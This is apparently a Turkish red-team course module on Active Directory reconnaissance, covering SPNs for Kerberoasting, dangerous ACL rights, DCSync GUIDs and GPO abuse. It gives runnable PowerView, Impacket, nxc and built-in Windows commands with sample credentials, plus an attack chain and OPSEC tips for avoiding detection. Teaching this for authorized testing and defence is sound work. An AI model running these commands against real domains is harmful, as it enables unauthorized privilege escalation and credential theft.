## 1. Kavramsal Temel — Neden Var?

Grafik (01.2) sana yolu gösterir; bu bölüm **yolu oluşturan tuğlaları** — tekil nesne özniteliklerini — derinlemesine okumayı öğretir. Dört hazine damarı vardır:

> **Kullanıcılar** kim olduğunu, **Gruplar** kimin neye yetkili olduğunu, **SPN'ler** hangi servis kimliklerinin Kerberoast edilebileceğini, **ACL'ler** (DACL) kimin kimin üzerinde ne yapabileceğini, **GPO'lar** ise koda dönüşen politika ile geniş çaplı sömürü fırsatını söyler.

Bunların en tehlikelisi **ACL keşfidir.** Çünkü AD'de yükseltme çoğu zaman bir "exploit" değil, **yanlış yapılandırılmış bir izin** üzerinden yürür: sıradan bir hesabın Domain Admins üzerinde `GenericAll`'a sahip olması bir "özellik kötüye kullanımı"dır, yama gelmez.

**Analoji:** Kullanıcı/grup = personel listesi ve ünvanlar. SPN = "bu kişi şu servisi çalıştırır" etiketi (parolası çalınabilir). ACL = her odanın kapısındaki "kim ne yapabilir" tabelası. GPO = binaya toplu uygulanan kural seti — kuralı yazabilen binayı yönetir.

## 2. Teknik Derinlik

### 2.1 SPN nedir, neden Kerberoast'ın anahtarı?

**SPN (Service Principal Name)** bir Kerberos servis kimliğini `<servis>/<host>:<port>` biçiminde tanımlar (örn. `MSSQLSvc/sql01.corp.local:1433`). Bir servis SPN'i **bir kullanıcı hesabına** kayıtlıysa (makine hesabına değil), o servis için istenen TGS bileti **o kullanıcının parola hash'i ile şifrelenir** → offline kırılabilir ([Modül 03](../Modul_03_Kimlik_Bilgisi_Erisimi/)).

```
(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))
    │
    └─▶ hasspn=true kullanıcılar = Kerberoast hedef havuzu
```

### 2.2 DACL anatomisi — hangi hak tehlikeli?

Her AD nesnesinin bir **nTSecurityDescriptor**'ı vardır; içinde **ACE (Access Control Entry)** listesi. Red için kritik haklar:

| ACE hakkı (ActiveDirectoryRights) | Ne yapılabilir | Hangi modül |
|-----------------------------------|----------------|-------------|
| `GenericAll` | Tam kontrol — parola sıfırla, hedefi ele | [M05](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/) |
| `GenericWrite` / `WriteProperty` | SPN/scriptPath/msDS-KeyCredentialLink yaz → Kerberoast/Shadow Cred | [M05](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/) / [M07](../Modul_07_AD_CS_PKI_Saldirilari/) |
| `WriteDacl` | DACL'i yeniden yaz → kendine GenericAll ver | [M05](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/) |
| `WriteOwner` | Sahipliği al → DACL yaz | [M05](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/) |
| `ForceChangePassword` (extended) | Parolayı bilmeden sıfırla | [M05](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/) |
| `DS-Replication-Get-Changes-All` | **DCSync** — tüm hash'leri çek | [M09](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/) |
| `AllExtendedRights` | ForceChangePassword + DCSync dahil | [M05](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/) / [M09](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/) |

### 2.3 ACE ikili yapısı ve extended-right GUID'leri

Bir DACL, `nTSecurityDescriptor` içinde sıralı **ACE** yapılarından oluşur. Her ACE:

```
ACE {
   AceType   : ACCESS_ALLOWED_ACE (0x00) | ACCESS_ALLOWED_OBJECT_ACE (0x05)
   AceFlags  : CONTAINER_INHERIT, OBJECT_INHERIT, INHERITED_ACE …
   AccessMask: 32-bit haklar (GENERIC_ALL=0x10000000, WRITE_DACL=0x40000, …)
   ObjectType: {GUID}   ← OBJECT_ACE ise: hangi öznitelik/extended-right
   SID       : yetkilendirilen principal
}
```

> **Kritik incelik — "extended right" GUID'i:** `ACCESS_ALLOWED_OBJECT_ACE` bir **extended right**'ı GUID ile hedefler. Bu GUID'ler sömürünün türünü belirler:

| Extended right GUID | Anlam | Sömürü |
|---------------------|-------|--------|
| `00299570-...` | User-Force-Change-Password | Parolayı bilmeden sıfırla |
| `1131f6aa-...` | DS-Replication-Get-Changes | DCSync (yarısı) |
| `1131f6ad-...` | DS-Replication-Get-Changes-All | **DCSync** (tam) → [M09](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/) |
| `00000000-...` (tümü) | AllExtendedRights | Yukarıdakilerin hepsi |

`Find-InterestingDomainAcl -ResolveGUIDs` bu GUID'leri okunur ada çevirir (`-ResolveGUIDs` olmadan çıktı anlamsız GUID'lerdir — daima kullan).

### 2.4 GPO sömürü yüzeyi

GPO'lar `CN=Policies,CN=System,DC=...` altında; `gPCFileSysPath` ile SYSVOL'deki klasöre işaret ederler. Bir GPO'ya **yazma** yetkin (veya bağlı olduğu OU'ya `WriteProperty gPLink`) varsa → GPO'ya kötücül ayar (zamanlanmış görev, script) enjekte edip **o OU'daki tüm makinelerde** kod çalıştırırsın → [SharpGPOAbuse, M05.3](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/).

```
   GPO sömürü kapıları:
   gpcMachineExtensionNames yaz  → Immediate Scheduled Task enjekte
   WriteProperty (gPLink) OU'ya  → kötücül GPO'yu OU'ya bağla
   New-GPOImmediateTask          → o OU'daki her makinede SYSTEM olarak kod
   → OU'da 500 makine varsa 500 makinede aynı anda çalıştırma
```

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 PowerView (klasik, en zengin)

```powershell
Import-Module .\PowerView.ps1

# SPN'li kullanıcılar (Kerberoast havuzu)
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# AS-REP roast adayları
Get-DomainUser -PreauthNotRequired | Select samaccountname

# "admincount=1" hesaplar (korunan/yüksek yetkili)
Get-DomainUser -AdminCount | Select samaccountname

# TEHLİKELİ ACL avı: benim kontrolümdeki principal'ların hedefleri
Find-InterestingDomainAcl -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|GenericWrite' }

# Belirli bir hedefin (Domain Admins) üzerinde kimlerin hakkı var?
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl' } |
  Select SecurityIdentifier,ActiveDirectoryRights

# GPO keşfi + hangi OU'ya bağlı
Get-DomainGPO | Select displayname,gpcfilesyspath
Get-DomainOU | Get-DomainGPOLocalGroup    # GPO ile yerel admin veren politikalar
```

### 3.2 Impacket / Linux araçları

```bash
# SPN'leri listele ve doğrudan Kerberoast'a hazırla
impacket-GetUserSPNs corp.local/jdoe:'Summer2024!' -dc-ip 10.10.10.5

# AS-REP roastable hesaplar
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.5 -no-pass

# ACL keşfi (Linux'tan)
dacledit.py -action read -target "Domain Admins" corp.local/jdoe:'Summer2024!' -dc-ip 10.10.10.5

# nxc ile toplu
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --kerberoasting kerb.txt
nxc ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --admin-count
```

**Örnek `GetUserSPNs` çıktısı:**
```
ServicePrincipalName        Name       MemberOf                        PasswordLastSet
--------------------------  ---------  ------------------------------  -------------------
MSSQLSvc/sql01:1433         svc-sql    CN=SQL Admins,...               2023-02-11 ...
HTTP/web01.corp.local       svc-web    -                               2021-08-03 ...   ← eski parola!
```
`PasswordLastSet` eski olan hesaplar = zayıf/kırılabilir parola olasılığı yüksek → öncelik ver.

### 3.3 dacledit / ADACLScan (odaklı ACL denetimi)

```bash
# Impacket dacledit — belirli bir hedefin DACL'ini oku (kim ne yapabiliyor)
dacledit.py -action read -target-dn "CN=Domain Admins,CN=Users,DC=corp,DC=local" \
  -principal jdoe corp.local/jdoe:'Summer2024!' -dc-ip 10.10.10.5

# BloodHound olmadan hızlı "benim SID'imin tehlikeli hakları" araması (PowerView)
$me = (Get-DomainUser jdoe).objectsid
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $me -and
  $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|WriteProperty|ExtendedRight' } |
  Select ObjectDN, ActiveDirectoryRights, ObjectAceType
```

**Örnek çıktı (kazanç):**
```
ObjectDN              : CN=svc-sql,CN=Users,DC=corp,DC=local
ActiveDirectoryRights : ExtendedRight
ObjectAceType         : User-Force-Change-Password   ← svc-sql parolasını sıfırlayabilirim!
```

### 3.4 Windows-yerleşik (LOLBin)

```cmd
:: yerleşik SPN keşfi — araç yok
setspn -T corp.local -Q */*

:: grup üyeliği
net group "Domain Admins" /domain
net user svc-sql /domain

:: adminCount=1 hesaplar (dsquery)
dsquery * -filter "(&(objectClass=user)(adminCount=1))" -attr samAccountName
```

### 3.5 Gerçek-dünya keşif → sömürü zinciri

```
   1) Get-DomainUser -SPN         → svc-sql (MSSQLSvc, PasswordLastSet 2021) → Kerberoast adayı
   2) Find-InterestingDomainAcl   → HELPDESK grubu svc-backup üzerinde ForceChangePassword
   3) Get-DomainGPOLocalGroup     → "Workstation Admins" GPO'su → tüm WS'lerde yerel admin
   4) adminCount=1 + memberOf boş  → eski/artık korunmayan admin izi (fazla yetki)
   Öncelik: en kısa + en sessiz zinciri seç → ilgili sömürü modülüne geç.
```

**OPSEC notları:**
- ACL keşfi **neredeyse görünmezdir** — bu yüzden Blue tarafı buna "tespit" değil **önleme** (DACL temizliği, [Blue 05.2](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.2_Tehlikeli_DACL_Denetimi_ve_Temizligi.md)) ile yanıt verir. Bu simetriyi bil: bulduğun kenar zaten kapatılmış olabilir.
- `Find-InterestingDomainAcl` çok sayıda ACE'yi hızla okur; SACL'li kritik nesnelerde 4662 üretebilir. Hedefli oku (yalnızca yüksek-değerli gruplar).
- `admincount=1` olup artık korunan grupta olmayan hesaplar = **eski AdminSDHolder izi** → sahip olması gerekenden fazla hakka sahip olabilir (SDProp gecikmesi).
